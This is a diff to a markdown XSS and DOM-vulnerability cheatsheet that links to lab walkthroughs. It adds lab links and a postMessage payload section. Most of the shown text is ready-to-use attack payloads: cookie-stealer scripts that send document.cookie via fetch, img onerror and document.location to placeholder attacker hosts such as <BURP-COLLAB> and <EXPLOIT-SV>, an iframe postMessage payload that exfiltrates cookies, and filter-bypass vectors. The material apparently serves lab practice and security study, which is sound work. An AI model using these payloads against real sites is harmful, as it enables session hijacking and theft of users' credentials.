@@ -1,17 +1,17 @@
-# XSS - CHEATSHEET + LABS
+# XSS && DOM vulnerabilities - CHEATSHEET + LABS
 
 ## Index
-- [Walkthrough - Most Important Labs](#walkthrough---most-important-labs)
-- [Obfuscation payload](../../03-Extra/obfuscating-payload.md) 👁️
-- [POC-COOKIE-STEALER](#poc-cookie-stealer) 🧪
-- [GENERIC & POC PAYLOADS](#generic-payloads-poc)
-- [COOKIE-STEALER](#cookie-stealer)
-- [DATA-STEALER](#data-stealer)
-- [BYPASS-RESTRICTIONS](#bypass-restrictions)
-- [SEARCH-SINK-AND-SOURCES](#sinks-and-sources) 🧪
-- [SVG-TAGS](#svg-tags)
-- [FIND TAGS AND EVENTS ALLOWED](#find-tags-and-events-allowed)
-
+- [XSS \&\& DOM vulnerabilities - CHEATSHEET + LABS](#xss--dom-vulnerabilities---cheatsheet--labs)
+  - [Index](#index)
+  - [Walkthrough - Most Important Labs](#walkthrough---most-important-labs)
+  - [CHEATSHEET](#cheatsheet)
+      - [POC-COOKIE-STEALER](#poc-cookie-stealer)
+      - [GENERIC-PAYLOADS-POC](#generic-payloads-poc)
+      - [BYPASS-RESTRICTIONS](#bypass-restrictions)
+      - [COOKIE-STEALER](#cookie-stealer)
+      - [SVG-TAGS](#svg-tags)
+      - [DOM-POST-MESSAGES](#dom-post-messages)
+      - [SINKS-AND-SOURCES](#sinks-and-sources)
 ## Walkthrough - Most Important Labs
 
 - [POC - HOW TO FIND DOM XSS WITH DOM INVADER](DOM-INTRUDER.md) 👁️
@@ -21,6 +21,10 @@
 - [DOM XSS in jQuery using onhashchange event # ](dom-xss-jquery-onhashchange.md) 🔥
 - [DOM XSS documentwirte sink + location.search sources -> closing select tag](dom-xss-documentwrite-select-tag.md) 🔥
 - [DOM XSS Reflected - eval() + json format without JSON.parse()](dom-xss-reflected-eval-json-escape.md)
+- [DOM XSS using web messages and JSON.parse](DOM-XSS-using-web-messages-and-JSON.parse.md)
+- [DOM based open redirect](DOM-based-open-redirect.md)
+- [DOM XSS cookie manipulator via last viewed product](dom-xss-cookie-manipulator-via-last-viewed-product.md) 🔥
+
 
 ## CHEATSHEET
 
@@ -103,13 +107,10 @@ http://foo?&apos;-alert(1)-&apos;
 
 ```
 
-
 #### COOKIE-STEALER
 ```js
 
 <script>fetch(`https://<BURP-COLLAB>/?cookie=`+btoa(document.cookie));</script>
-
-
 
 <img src=0 onerror=this.src='https://<IP>/?cookie='+btoa(document.cookie)>
 
@@ -127,12 +128,11 @@ JavaScript:document.location='https://<BURP-COLLAB>?cookie='+document.cookie
 
 ${document.location='https://<BURP-COLLAB>/?cookies'+document.cookie;}
 
-
 <script>fetch(`https://<BURP-COLLAB>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>
 <script>fetch(`https://<EXPLOIT-SV>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>
 
 <svg><animateTransform onbegin=fetch('https://<BURP-COLLAB>?cookie='+btoa(document.cookie))>
-
+```
 
 // tags / atributtes blacklisted
 <iframe
@@ -207,6 +207,21 @@ req2.send(response);
 
 <svg><a><animate attributeName= href values=javascript:alert(0) /><text x=30 y=30>Click me!</a>
 
+```
+
+#### DOM-POST-MESSAGES
+```js
+
+// basic post message
+window.postMessage('<img src=0 onerror=alert(1)>');
+
+// post message in url
+<iframe width=100% height=100% src="<ip>" 
+onload='this.contentWindow.postMessage("javascript:alert(0)//https://google.com","*")'></iframe>
+
+
+<iframe src="https://<IP>/" onload="this.contentWindow.postMessage('<img src=0 onerror=alert(1)>', '*')"></iframe>
+<iframe src="https://<IP>/" onload="this.contentWindow.postMessage('<img src=0 onerror=fetch(`https://EXPLOIT-SV>/?cookie=`+btoa(document.cookie))>', '*')"></iframe>
 ```
 
 #### SINKS-AND-SOURCES
